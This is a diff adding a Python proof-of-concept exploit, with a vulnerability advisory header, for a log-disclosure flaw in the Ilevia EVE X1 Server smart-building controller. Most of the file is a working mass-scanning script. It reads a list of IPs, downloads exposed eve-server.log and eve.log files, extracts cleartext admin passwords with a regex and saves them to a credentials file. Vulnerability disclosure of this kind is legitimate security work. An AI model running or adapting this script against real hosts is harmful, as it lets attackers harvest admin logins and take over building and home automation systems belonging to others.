@@ -1,0 +1,120 @@
+#!/usr/bin/env python
+#
+#
+# Ilevia EVE X1 Server 4.7.18.0.eden Credentials Leak Through Log Disclosure
+#
+#
+# Vendor: Ilevia Srl.
+# Product web page: https://www.ilevia.com
+# Affected version: <= 4.7.18.0.eden (Logic ver: 6.00)
+#
+# Summary: EVE is a smart home and building automation solution designed
+# for both residential and commercial environments, including malls, hotels,
+# restaurants, bars, gyms, spas, boardrooms, and offices. It enables comprehensive
+# control and monitoring of electrical installations through a highly customizable,
+# user-friendly interface.
+#
+# EVE is a multi-protocol platform that integrates various systems within
+# a smart building to enhance comfort, security, safety, and energy efficiency.
+# Users can manage building functions via iPhone, iPad, Android devices, Windows
+# PCs, or Mac computers.
+#
+# The EVE X1 Server is the dedicated hardware solution for advanced building
+# automation needs. Compact and powerful, it is ideal for apartments, small
+# to medium-sized homes, and smaller commercial installations. It is designed
+# to manage entire automation systems reliably and efficiently.
+#
+# Desc: A critical vulnerability was identified in the EVE smart home and BMS/BAS
+# controller system due to improper handling of sensitive information in server-side
+# logging. Specifically, .log files accessible via the web server expose cleartext
+# credentials, including username and password submitted during authentication
+# process. This disclosure enables unauthenticated remote attackers to retrieve
+# valid login credentials simply by accessing exposed log files, leading to full
+# system compromise.
+#
+# Tested on: GNU/Linux 5.4.35 (armv7l)
+#            GNU/Linux 4.19.97 (armv7l)
+#            Armbian 20.02.1 Buster
+#            Apache/2.4.38 (Debian)
+#            PHP Version 7.3.14
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2025-5957
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5957.php
+#
+# CWE ID: 532
+# CWE URL: https://cwe.mitre.org/data/definitions/532.html
+#
+#
+# 01.05.2024
+#
+
+import requests
+import sys#####
+import re######
+
+def leak(line):
+    match = re.search(r'Authenticate R:1 admin\s+([^\s\[]+)', line)
+    return match.group(1) if match else None
+
+def target(ip, port):
+    paths = [
+        f"http://{ip}:{port}/80-history/eve-server.log",
+        f"http://{ip}:{port}/80-history/eve.log"
+    ]
+    for url in paths:
+        try:
+            r = requests.get(url, timeout=5)
+            if r.status_code == 200:
+                for line in r.text.splitlines():
+                    if "Authenticate R:1 admin" in line:
+                        pwd = leak(line)
+                        if pwd:
+                            return f"{ip}:{port}:admin:{pwd}"
+            elif r.status_code == 404:
+                return None
+        except requests.exceptions.RequestException:
+            return None
+    return None
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} IPLIST.txt")
+        sys.exit(1)
+
+    I_file = sys.argv[1]
+    O_file = "valid_creds.txt"
+    default_port = "8080"
+    results = []
+
+    with open(I_file, "r") as f:
+        ip_list = [line.strip() for line in f if line.strip()]
+
+    total = len(ip_list)
+    for idx, line in enumerate(ip_list, 1):
+        if ':' in line:
+            ip, port = line.split(':', 1)
+        else:
+            ip, port = line, default_port
+
+        print(f"[{idx}/{total}] Scanning {ip}:{port}...", end="\r")
+        result = target(ip, port)
+        if result:
+            print(" " * 80, end="\r")
+            print(f"[+] {result}")
+            results.append(result)
+
+    if results:
+        with open(O_file, "w") as out:
+            for line in results:
+                out.write(line + "\n")
+        print(f"\n[+] Done. {len(results)} valid credentials saved to {O_file}")
+    else:
+        print("\n[-] No credentials leaked.")
+
+if __name__ == "__main__":
+    main()
